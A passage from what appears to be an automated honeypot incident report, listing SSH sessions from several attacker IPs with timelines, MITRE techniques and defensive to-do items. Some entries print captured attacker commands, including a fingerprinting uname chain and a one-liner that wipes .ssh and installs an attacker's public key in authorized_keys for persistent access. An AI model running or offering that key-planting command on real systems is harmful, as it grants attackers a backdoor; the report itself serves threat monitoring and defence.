| **First Seen** | 2026-08-23 19:27 |
| **Last Seen** | 2026-08-23 19:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 19:27:16` | `cowrie.session.connect` |
| `2026-08-23 19:27:16` | `cowrie.client.version` |
| `2026-08-23 19:27:16` | `cowrie.client.kex` |
| `2026-08-23 19:27:17` | `cowrie.login.success` |
| `2026-08-23 19:27:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.39[.]103` to AbuseIPDB if not already reported
- [ ] Block `118.193.39[.]103` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f45a2429eaa2

| Field | Detail |
|---|---|
| **Source IP** | `118.193.39[.]103` |
| **First Seen** | 2026-08-23 19:27 |
| **Last Seen** | 2026-08-23 19:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 19:27:17` | `cowrie.session.connect` |
| `2026-08-23 19:27:17` | `cowrie.client.version` |
| `2026-08-23 19:27:18` | `cowrie.client.kex` |
| `2026-08-23 19:27:18` | `cowrie.login.success` |
| `2026-08-23 19:27:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.39[.]103` to AbuseIPDB if not already reported
- [ ] Block `118.193.39[.]103` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e4495a847ee4

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-23 19:28 |
| **Last Seen** | 2026-08-23 19:28 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 19:28:00` | `cowrie.session.connect` |
| `2026-08-23 19:28:00` | `cowrie.client.version` |
| `2026-08-23 19:28:00` | `cowrie.client.kex` |
| `2026-08-23 19:28:01` | `cowrie.login.success` |
| `2026-08-23 19:28:02` | `cowrie.session.params` |
| `2026-08-23 19:28:02` | `cowrie.command.input` |
| `2026-08-23 19:28:02` | `cowrie.command.input` |
| `2026-08-23 19:28:02` | `cowrie.command.input` |
| `2026-08-23 19:28:02` | `cowrie.command.input` |
| `2026-08-23 19:28:02` | `cowrie.command.input` |
| `2026-08-23 19:28:02` | `cowrie.command.success` |
| `2026-08-23 19:28:02` | `cowrie.command.input` |
| `2026-08-23 19:28:02` | `cowrie.command.input` |
| `2026-08-23 19:28:02` | `cowrie.command.input` |
| `2026-08-23 19:28:02` | `cowrie.command.input` |
| `2026-08-23 19:28:03` | `cowrie.log.closed` |
| `2026-08-23 19:28:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-89081b858903

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 19:29 |
| **Last Seen** | 2026-08-23 19:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 19:29:17` | `cowrie.session.connect` |
| `2026-08-23 19:29:17` | `cowrie.client.version` |
| `2026-08-23 19:29:17` | `cowrie.client.kex` |
| `2026-08-23 19:29:18` | `cowrie.login.success` |
| `2026-08-23 19:29:19` | `cowrie.direct-tcpip.request` |
| `2026-08-23 19:29:19` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 19:29:19` | `cowrie.direct-tcpip.data` |
| `2026-08-23 19:29:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3059c9e4c095

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 19:29 |
| **Last Seen** | 2026-08-23 19:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 19:29:21` | `cowrie.session.connect` |
| `2026-08-23 19:29:21` | `cowrie.client.version` |
| `2026-08-23 19:29:21` | `cowrie.client.kex` |
| `2026-08-23 19:29:22` | `cowrie.login.success` |
| `2026-08-23 19:29:22` | `cowrie.direct-tcpip.request` |
| `2026-08-23 19:29:22` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 19:29:22` | `cowrie.direct-tcpip.data` |
| `2026-08-23 19:29:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3fa6c9d0987e

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-23 19:29 |
| **Last Seen** | 2026-08-23 19:30 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 19:29:58` | `cowrie.session.connect` |
| `2026-08-23 19:29:58` | `cowrie.client.version` |
| `2026-08-23 19:29:59` | `cowrie.client.kex` |
| `2026-08-23 19:30:00` | `cowrie.login.success` |
| `2026-08-23 19:30:01` | `cowrie.session.params` |
| `2026-08-23 19:30:01` | `cowrie.command.input` |
| `2026-08-23 19:30:01` | `cowrie.command.input` |
| `2026-08-23 19:30:01` | `cowrie.command.input` |
| `2026-08-23 19:30:01` | `cowrie.command.input` |
| `2026-08-23 19:30:01` | `cowrie.command.input` |
| `2026-08-23 19:30:01` | `cowrie.command.success` |
| `2026-08-23 19:30:01` | `cowrie.command.input` |
| `2026-08-23 19:30:01` | `cowrie.command.input` |
| `2026-08-23 19:30:01` | `cowrie.command.input` |
| `2026-08-23 19:30:01` | `cowrie.command.input` |
| `2026-08-23 19:30:01` | `cowrie.log.closed` |
| `2026-08-23 19:30:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c55e0be69275

| Field | Detail |
|---|---|
| **Source IP** | `139.59.208[.]49` |
| **First Seen** | 2026-08-23 19:30 |
| **Last Seen** | 2026-08-23 19:30 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 19:30:05` | `cowrie.session.connect` |
| `2026-08-23 19:30:05` | `cowrie.client.version` |
| `2026-08-23 19:30:06` | `cowrie.client.kex` |
| `2026-08-23 19:30:06` | `cowrie.login.success` |
| `2026-08-23 19:30:07` | `cowrie.session.params` |
| `2026-08-23 19:30:07` | `cowrie.command.input` |
| `2026-08-23 19:30:07` | `cowrie.command.failed` |
| `2026-08-23 19:30:07` | `cowrie.log.closed` |
| `2026-08-23 19:30:08` | `cowrie.session.params` |
| `2026-08-23 19:30:08` | `cowrie.command.input` |
| `2026-08-23 19:30:08` | `cowrie.session.file_download` |
| `2026-08-23 19:30:08` | `cowrie.log.closed` |
| `2026-08-23 19:30:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.208[.]49` to AbuseIPDB if not already reported
- [ ] Block `139.59.208[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be2bbbaf2fd3

| Field | Detail |
|---|---|
| **Source IP** | `139.59.208[.]49` |
| **First Seen** | 2026-08-23 19:30 |
| **Last Seen** | 2026-08-23 19:30 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 19:30:08` | `cowrie.session.connect` |
| `2026-08-23 19:30:08` | `cowrie.client.version` |
| `2026-08-23 19:30:08` | `cowrie.client.kex` |
| `2026-08-23 19:30:08` | `cowrie.login.success` |
| `2026-08-23 19:30:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.208[.]49` to AbuseIPDB if not already reported
- [ ] Block `139.59.208[.]49` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d66cdb251078

| Field | Detail |
|---|---|
| **Source IP** | `139.59.208[.]49` |
| **First Seen** | 2026-08-23 19:30 |
| **Last Seen** | 2026-08-23 19:30 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 19:30:09` | `cowrie.session.connect` |
| `2026-08-23 19:30:09` | `cowrie.client.version` |
| `2026-08-23 19:30:09` | `cowrie.client.kex` |
| `2026-08-23 19:30:09` | `cowrie.login.success` |
| `2026-08-23 19:30:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.208[.]49` to AbuseIPDB if not already reported
- [ ] Block `139.59.208[.]49` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e622a2d1ef1

| Field | Detail |
|---|---|
| **Source IP** | `57.129.47[.]135` |
| **First Seen** | 2026-08-23 19:30 |
| **Last Seen** | 2026-08-23 19:30 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 19:30:12` | `cowrie.session.connect` |
| `2026-08-23 19:30:12` | `cowrie.client.version` |
| `2026-08-23 19:30:12` | `cowrie.client.kex` |
| `2026-08-23 19:30:12` | `cowrie.login.success` |
| `2026-08-23 19:30:13` | `cowrie.session.params` |
| `2026-08-23 19:30:13` | `cowrie.command.input` |
| `2026-08-23 19:30:13` | `cowrie.command.failed` |
| `2026-08-23 19:30:13` | `cowrie.log.closed` |
| `2026-08-23 19:30:14` | `cowrie.session.params` |
| `2026-08-23 19:30:14` | `cowrie.command.input` |
| `2026-08-23 19:30:14` | `cowrie.session.file_download` |
| `2026-08-23 19:30:14` | `cowrie.log.closed` |
| `2026-08-23 19:30:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `57.129.47[.]135` to AbuseIPDB if not already reported
- [ ] Block `57.129.47[.]135` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0502c4630d39

| Field | Detail |
|---|---|
| **Source IP** | `57.129.47[.]135` |
| **First Seen** | 2026-08-23 19:30 |
| **Last Seen** | 2026-08-23 19:30 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 19:30:14` | `cowrie.session.connect` |
| `2026-08-23 19:30:14` | `cowrie.client.version` |
| `2026-08-23 19:30:14` | `cowrie.client.kex` |
| `2026-08-23 19:30:15` | `cowrie.login.success` |
| `2026-08-23 19:30:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `57.129.47[.]135` to AbuseIPDB if not already reported
- [ ] Block `57.129.47[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c616ae837867

| Field | Detail |
|---|---|
| **Source IP** | `57.129.47[.]135` |
| **First Seen** | 2026-08-23 19:30 |
| **Last Seen** | 2026-08-23 19:30 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 19:30:15` | `cowrie.session.connect` |
| `2026-08-23 19:30:15` | `cowrie.client.version` |
| `2026-08-23 19:30:15` | `cowrie.client.kex` |
| `2026-08-23 19:30:15` | `cowrie.login.success` |
| `2026-08-23 19:30:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `57.129.47[.]135` to AbuseIPDB if not already reported
- [ ] Block `57.129.47[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dbfdbd166df4

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-08-23 19:30 |
| **Last Seen** | 2026-08-23 19:30 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 19:30:47` | `cowrie.session.connect` |
| `2026-08-23 19:30:47` | `cowrie.client.version` |
| `2026-08-23 19:30:47` | `cowrie.client.kex` |
| `2026-08-23 19:30:48` | `cowrie.login.success` |
| `2026-08-23 19:30:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4b8345bf44e3

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-08-23 19:30 |
| **Last Seen** | 2026-08-23 19:30 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 19:30:48` | `cowrie.session.connect` |
| `2026-08-23 19:30:48` | `cowrie.client.version` |
| `2026-08-23 19:30:48` | `cowrie.client.kex` |
| `2026-08-23 19:30:48` | `cowrie.login.success` |
| `2026-08-23 19:30:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-540295c09f80

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-08-23 19:30 |
| **Last Seen** | 2026-08-23 19:30 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 19:30:49` | `cowrie.session.connect` |
| `2026-08-23 19:30:49` | `cowrie.client.version` |
| `2026-08-23 19:30:49` | `cowrie.client.kex` |
| `2026-08-23 19:30:49` | `cowrie.login.success` |
| `2026-08-23 19:30:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db937729a516

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-08-23 19:30 |
| **Last Seen** | 2026-08-23 19:30 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 19:30:50` | `cowrie.session.connect` |
| `2026-08-23 19:30:50` | `cowrie.client.version` |
| `2026-08-23 19:30:50` | `cowrie.client.kex` |
| `2026-08-23 19:30:50` | `cowrie.login.success` |
| `2026-08-23 19:30:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2c70c25e0647

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-23 19:32 |
| **Last Seen** | 2026-08-23 19:32 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 19:32:00` | `cowrie.session.connect` |
| `2026-08-23 19:32:00` | `cowrie.client.version` |
| `2026-08-23 19:32:00` | `cowrie.client.kex` |
| `2026-08-23 19:32:00` | `cowrie.login.success` |
| `2026-08-23 19:32:01` | `cowrie.session.params` |
| `2026-08-23 19:32:01` | `cowrie.command.input` |
| `2026-08-23 19:32:01` | `cowrie.command.input` |
| `2026-08-23 19:32:01` | `cowrie.command.input` |
| `2026-08-23 19:32:01` | `cowrie.command.input` |
| `2026-08-23 19:32:01` | `cowrie.command.input` |
| `2026-08-23 19:32:01` | `cowrie.command.success` |
| `2026-08-23 19:32:01` | `cowrie.command.input` |
| `2026-08-23 19:32:01` | `cowrie.command.input` |
| `2026-08-23 19:32:01` | `cowrie.command.input` |
| `2026-08-23 19:32:01` | `cowrie.command.input` |
| `2026-08-23 19:32:02` | `cowrie.log.closed` |
| `2026-08-23 19:32:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-02a983a19de2

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-23 19:34 |
| **Last Seen** | 2026-08-23 19:34 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 19:34:01` | `cowrie.session.connect` |
| `2026-08-23 19:34:01` | `cowrie.client.version` |
| `2026-08-23 19:34:01` | `cowrie.client.kex` |
| `2026-08-23 19:34:02` | `cowrie.login.success` |
| `2026-08-23 19:34:03` | `cowrie.session.params` |
| `2026-08-23 19:34:03` | `cowrie.command.input` |
| `2026-08-23 19:34:03` | `cowrie.command.input` |
| `2026-08-23 19:34:03` | `cowrie.command.input` |
| `2026-08-23 19:34:03` | `cowrie.command.input` |
| `2026-08-23 19:34:03` | `cowrie.command.input` |
| `2026-08-23 19:34:03` | `cowrie.command.success` |
| `2026-08-23 19:34:03` | `cowrie.command.input` |
| `2026-08-23 19:34:03` | `cowrie.command.input` |
| `2026-08-23 19:34:03` | `cowrie.command.input` |
| `2026-08-23 19:34:03` | `cowrie.command.input` |
| `2026-08-23 19:34:04` | `cowrie.log.closed` |
| `2026-08-23 19:34:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-609b4b96d5ae

| Field | Detail |
|---|---|
| **Source IP** | `163.7.1[.]218` |
| **First Seen** | 2026-08-23 19:35 |
| **Last Seen** | 2026-08-23 19:35 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 19:35:35` | `cowrie.session.connect` |
| `2026-08-23 19:35:35` | `cowrie.client.version` |
| `2026-08-23 19:35:36` | `cowrie.client.kex` |
| `2026-08-23 19:35:37` | `cowrie.login.success` |
| `2026-08-23 19:35:38` | `cowrie.session.params` |
| `2026-08-23 19:35:38` | `cowrie.command.input` |
| `2026-08-23 19:35:38` | `cowrie.command.failed` |
| `2026-08-23 19:35:38` | `cowrie.log.closed` |
| `2026-08-23 19:35:39` | `cowrie.session.params` |
| `2026-08-23 19:35:39` | `cowrie.command.input` |
| `2026-08-23 19:35:40` | `cowrie.session.file_download` |
| `2026-08-23 19:35:40` | `cowrie.log.closed` |
| `2026-08-23 19:35:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `163.7.1[.]218` to AbuseIPDB if not already reported
- [ ] Block `163.7.1[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8c115ce4ee00

| Field | Detail |
|---|---|
| **Source IP** | `163.7.1[.]218` |
| **First Seen** | 2026-08-23 19:35 |
| **Last Seen** | 2026-08-23 19:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 19:35:40` | `cowrie.session.connect` |
| `2026-08-23 19:35:40` | `cowrie.client.version` |
| `2026-08-23 19:35:40` | `cowrie.client.kex` |
| `2026-08-23 19:35:41` | `cowrie.login.success` |
| `2026-08-23 19:35:42` | `cowrie.session.closed` |

**Recommended Actions:**
